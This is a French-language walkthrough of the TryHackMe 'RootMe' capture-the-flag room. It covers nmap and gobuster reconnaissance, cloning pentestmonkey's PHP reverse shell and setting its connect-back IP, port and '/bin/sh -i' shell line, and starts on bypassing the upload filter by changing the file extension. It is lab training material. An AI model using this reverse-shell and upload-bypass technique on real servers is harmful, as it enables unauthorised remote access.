# **[ROOTME](https://tryhackme.com/r/room/rrootme)**

## TACHE 1 - Deploy the machine

Suivez simplement les instructions pour déployer la machine virtuelle.

<br>

## TACHE 2 - Reconnaissance
<pre>
First, let's get information about the target.
<br>Commençons par obtenir des informations sur la cible.
</pre>

### Question 1
<pre>
Scan the machine, how many ports are open ?
<br>Scannez la machine, combien de ports sont ouverts ?
</pre>

### Question 2
<pre>
What version of Apache is running?
<br>Quelle version d'Apache est active?
</pre>

### Question 3
<pre>
What service is running on port 22?
Quel service est exécuté sur le port 22?
</pre>

J'ai regroupé les trois premières questions car nous pouvons y répondre avec une seule commande:

> [!TIP]
> Question Hint
>
> Use nmap to do a port scan.
> <br>Utilisez nmap pour effectuer le scanne de port

<br>En cherchant dans le manuel de la commande `nmap`, on voit que l'option `-sV` permet de scanner les ports ouverts et d'afficher les informations relatives aux services ainsi comme leur version:

```bash
nmap -sV 10.10.182.207
```

> [!WARNING]
> Adaptez la commande à l'adresse IP de VOTRE machine virtuelle. Elle change à chaque connexion, il est donc peu probable qu'elle soit identique à la mienne au moment où j'écris ce guide.

Réponse 1: <b>x</b>
<br>Réponse 2: <b>x.x.xx</b>
<br>Réponse: <b>xxx</b>

<br>

### Question 4
<pre>
What is the hidden directory?
Quel est le repertoire caché?
</pre>

Pour répondre à cette question, utilisez l'astuce qui ne nécessite pas de réponse:

> [!TIP]
> gobuster dir -u MACHINE_IP -w WORDLIST_PATH

Remplacez `MACHINE_IP` par l'IP de votre machine virtuelle et `WORDLIST_PATH` par le chemin de l'un des wordlists, qui, pour Gobuster, se trouvent dans: `/usr/share/wordlists/dirbuster/`

Réponse: <b>/xxxxx/</b>

<br>

## TACHE 3 - Getting a Shell
<pre>
Find a form to upload and get a reverse shell, and find the flag.
Trouvez un formulaire pour télécharger et obtenir un shell inversé et trouvez le drapeau.
</pre>

> [!TIP]
> Search for "file upload bypass" and "PHP reverse shell".
> Recherchez « file upload bypass » et « PHP reverse shell ».

<br>Commencez par ouvrir Firefox sur la machine distante et rentrez son IP:

<pre>
http://MACHINE_IP
</pre>

<br>Vous verrez une page d'accueil avec simplement écrit: 

<pre>
root@rootme:~#
Can you root me?
</pre>

Vous ne pouvez rien faire sur la page d'accueil mais il est toujours bon de regarder ce qui se cache dans le code-source avec `CTRL+U`:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/home.css">
    <script src="js/maquina_de_escrever.js"></script>
    <title>HackIT - Home</title>
</head>
<body>
    <div class="main-div">
        <p class="title">root@rootme:~#</p>
        <p class="description">
            Can you root me?
        </p>
    </div>

    <!--  -->

    <script>
        const titulo = document.querySelector('.title');
        typeWrite(titulo);
    </script>
</body>
</html>
```

Bon, je n'ai jamais dit que c'était toujours intéressant mais c'est un réflexe à avoir systématiquement. Mais ce code ne nous apporte rien.
<br>Rendons nous dans le dossier caché que nous avons découvert avec Gobuster toute à l'heure:

<pre>
http://MACHINE_IP/dossier
</pre>

Ah, tiens, un formulaire de téléchargement ! Comme conseillé dans l'astuce:

<pre>
Select a file to upload:
Browse... No file selected
Upload
</pre>

Nous allons donc pouvoir uploader un script, plus précisément, un script de `reverse shell en php` puisque c'est une des contraintes de l'astuce.
<br>Après quelques recherches, il semble qu'il y en ait un qui soit souvent utilisé, celui de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).

Rendez-vous dans le dossier de téléchargement de la machine distante et téléchargez le script:

```bash
cd Downloads
```
```bash
git clone https://github.com/pentestmonkey/php-reverse-shell
```

Puis rendez-vous dans le dossier:

```bash
cd php-reverse-shell
```

Il va falloir modifier l'IP et le port dans le fichier `php-reverse-shell.php`. 
<br>Editez-le avec `nano` et modifiez ces lignes comme suit:

```php
[...]

set_time_limit (0);
$VERSION = "1.0";
$ip = 'YOUR_MACHINE_IP';  // CHANGE THIS
$port = 80;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

[...]
```

<br>Nous utilisons le serveur web de la machine distante, qui est sur le port 80.
<br>Il faut, ensuite, rendre le fichier exécutable:

```bash
chmod +x php-reverse-shell.php
```

Vous pouvez maintenant uploader le fichier php... BIM ! Une erreur !
<br>Elle est dûe au fait que les fichiers `php` ne sont pas autorisés à être téléchargés. Aucun problème, nous allons essayer de contourner le téléchargement en modifiant l'extension du fichier.